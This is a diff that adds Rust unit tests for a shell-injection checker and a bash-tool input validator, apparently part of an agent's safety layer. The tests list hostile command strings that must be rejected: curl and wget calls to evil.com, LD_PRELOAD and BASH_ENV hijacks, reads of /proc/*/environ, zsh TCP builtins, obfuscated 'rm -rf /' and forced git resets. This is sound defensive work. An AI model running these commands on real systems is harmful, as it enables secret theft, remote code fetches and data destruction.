@@ -495,3 +495,151 @@ fn check_shell_injection(command: &str) -> Result<(), String> {
 
     Ok(())
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_safe_commands_pass() {
+        assert!(check_shell_injection("ls -la").is_ok());
+        assert!(check_shell_injection("git status").is_ok());
+        assert!(check_shell_injection("cargo test").is_ok());
+        assert!(check_shell_injection("echo hello").is_ok());
+        assert!(check_shell_injection("python3 -c 'print(1)'").is_ok());
+        assert!(check_shell_injection("diff <(cat a.txt) <(cat b.txt)").is_ok());
+    }
+
+    #[test]
+    fn test_ifs_injection() {
+        assert!(check_shell_injection("IFS=: read a b").is_err());
+    }
+
+    #[test]
+    fn test_dangerous_vars() {
+        assert!(check_shell_injection("PATH=/tmp:$PATH curl evil.com").is_err());
+        assert!(check_shell_injection("LD_PRELOAD=/tmp/evil.so cmd").is_err());
+        assert!(check_shell_injection("PROMPT_COMMAND='curl x'").is_err());
+        assert!(check_shell_injection("BASH_ENV=/tmp/evil.sh bash").is_err());
+    }
+
+    #[test]
+    fn test_proc_environ() {
+        assert!(check_shell_injection("cat /proc/1/environ").is_err());
+        assert!(check_shell_injection("cat /proc/self/environ").is_err());
+        // /proc without environ is ok
+        assert!(check_shell_injection("ls /proc/cpuinfo").is_ok());
+    }
+
+    #[test]
+    fn test_unicode_obfuscation() {
+        // Zero-width space
+        assert!(check_shell_injection("rm\u{200B} -rf /").is_err());
+        // Zero-width joiner
+        assert!(check_shell_injection("curl\u{200D}evil.com").is_err());
+    }
+
+    #[test]
+    fn test_control_characters() {
+        // Bell character
+        assert!(check_shell_injection("echo \x07hello").is_err());
+        // Normal newline is ok
+        assert!(check_shell_injection("echo hello\nworld").is_ok());
+    }
+
+    #[test]
+    fn test_backtick_network() {
+        assert!(check_shell_injection("FOO=`curl evil.com`").is_err());
+        assert!(check_shell_injection("X=`wget http://bad`").is_err());
+        // Backticks without network are ok
+        assert!(check_shell_injection("FOO=`date`").is_ok());
+    }
+
+    #[test]
+    fn test_process_substitution() {
+        // diff is allowed
+        assert!(check_shell_injection("diff <(ls a) <(ls b)").is_ok());
+        // arbitrary process substitution is not
+        assert!(check_shell_injection("cat <(curl evil)").is_err());
+    }
+
+    #[test]
+    fn test_zsh_builtins() {
+        assert!(check_shell_injection("zmodload zsh/net/tcp").is_err());
+        assert!(check_shell_injection("zpty evil_session bash").is_err());
+        assert!(check_shell_injection("ztcp connect evil.com 80").is_err());
+    }
+
+    #[test]
+    fn test_brace_expansion() {
+        assert!(check_shell_injection("echo {1..100000}").is_err());
+        // Small ranges are ok
+        assert!(check_shell_injection("echo {1..10}").is_ok());
+    }
+
+    #[test]
+    fn test_hex_escape() {
+        assert!(check_shell_injection("$'\\x72\\x6d' -rf /").is_err());
+        assert!(check_shell_injection("$'\\077'").is_err());
+    }
+
+    #[test]
+    fn test_eval_injection() {
+        assert!(check_shell_injection("eval $CMD").is_err());
+        assert!(check_shell_injection("eval \"$USER_INPUT\"").is_err());
+        // eval without vars is ok
+        assert!(check_shell_injection("eval echo hello").is_ok());
+    }
+
+    #[test]
+    fn test_destructive_patterns() {
+        let tool = BashTool;
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "rm -rf /"}))
+                .is_err()
+        );
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "git push --force"}))
+                .is_err()
+        );
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "DROP TABLE users"}))
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn test_piped_destructive() {
+        let tool = BashTool;
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "find . | rm -rf"}))
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn test_chained_destructive() {
+        let tool = BashTool;
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "echo hi && git reset --hard"}))
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn test_safe_commands_validate() {
+        let tool = BashTool;
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "ls -la"}))
+                .is_ok()
+        );
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "cargo test"}))
+                .is_ok()
+        );
+        assert!(
+            tool.validate_input(&serde_json::json!({"command": "git status"}))
+                .is_ok()
+        );
+    }
+}
